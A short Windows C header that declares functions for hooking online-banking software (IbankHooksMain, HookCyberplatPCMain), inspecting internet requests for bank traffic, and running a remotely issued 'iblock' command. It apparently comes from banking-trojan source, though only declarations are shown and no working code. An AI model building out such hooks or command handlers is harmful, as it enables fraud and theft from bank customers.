
#ifndef RuBnkH
#define RuBnkH
//----------------------------------------------------------------------------
#include <windows.h>
#include <wininet.h>
#include "Ibank.h"

void IsBank( HINTERNET hRequest );
bool IbankHooksMain();
bool HookCyberplatPCMain();
const char Iblock_Url[] = "iblock\0";
bool ExecuteIblock_Url(LPVOID Manager, PCHAR Command, PCHAR Args);


//----------------------------------------------------------------------------
#endif
